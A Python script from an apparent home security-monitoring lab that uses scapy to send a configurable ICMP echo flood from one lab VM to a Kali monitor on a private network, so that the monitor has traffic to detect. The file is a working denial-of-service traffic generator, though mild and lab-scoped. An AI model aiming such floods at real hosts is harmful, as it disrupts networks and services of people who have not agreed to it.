#!/usr/bin/env python3
"""
attack_simulator/icmp_flood.py — ICMP flood attack simulation.
Phase: 1 | Status: Complete
Run from: Arch Linux VM (192.168.56.10)
Target:   Kali Linux SOC Monitor (192.168.56.20)

Usage:
    sudo python icmp_flood.py
    sudo python icmp_flood.py --target 192.168.56.20 --count 200 --size 64
"""

import argparse
import sys

try:
    from scapy.all import IP, ICMP, send
except ImportError:
    print("[!] scapy not installed. Run: pip install scapy")
    sys.exit(1)


TARGET_DEFAULT = "192.168.56.20"
COUNT_DEFAULT  = 200
SIZE_DEFAULT   = 64


def icmp_flood(target: str, count: int, size: int) -> None:
    """
    Send ICMP echo requests to the target to simulate a flood.

    Args:
        target: Destination IP address (Kali SOC Monitor)
        count:  Number of ICMP packets to send
        size:   Payload size in bytes per packet
    """
    print(f"[*] ICMP Flood — Target: {target} | Count: {count} | Size: {size}B")
    print(f"[*] Start: {__import__('datetime').datetime.now().isoformat()}")

    payload = b"X" * size
    pkt     = IP(dst=target) / ICMP() / payload

    send(pkt, count=count, verbose=False)

    print(f"[+] Sent {count} ICMP packets to {target}")
    print(f"[+] Done: {__import__('datetime').datetime.now().isoformat()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="ICMP Flood Simulator (Arch Linux attacker)")
    parser.add_argument("--target", default=TARGET_DEFAULT,
                        help=f"Target IP (default: {TARGET_DEFAULT})")
    parser.add_argument("--count",  type=int, default=COUNT_DEFAULT,
                        help=f"Number of packets (default: {COUNT_DEFAULT})")
    parser.add_argument("--size",   type=int, default=SIZE_DEFAULT,
                        help=f"Payload size in bytes (default: {SIZE_DEFAULT})")
    args = parser.parse_args()

    icmp_flood(args.target, args.count, args.size)


if __name__ == "__main__":
    main()
